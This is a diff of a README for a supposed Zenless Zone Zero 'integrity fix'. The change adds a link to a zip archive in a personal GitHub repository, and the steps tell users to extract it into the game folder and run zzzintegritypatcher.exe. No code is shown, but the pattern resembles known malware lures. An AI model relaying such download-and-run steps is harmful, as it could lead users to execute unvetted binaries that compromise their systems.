@@ -1,7 +1,7 @@
 ## ZZZ Resource Integrity Fix Manual
 
 **How to use:**
-- Download "integrity patcher.rar"
+- [Download Here](https://github.com/Texas124/ZZZ-Integrity-Fix-Manual/blob/main/integrity%20patcher.zip)
 - Extract in folder the same as "ZenlessZoneZero Game" directory:
 - <img width="242" alt="image" src="https://github.com/user-attachments/assets/bbf66219-eadf-4fac-ba0c-014be9bc45e7">
 - Open the zzzintegritypatcher.exe
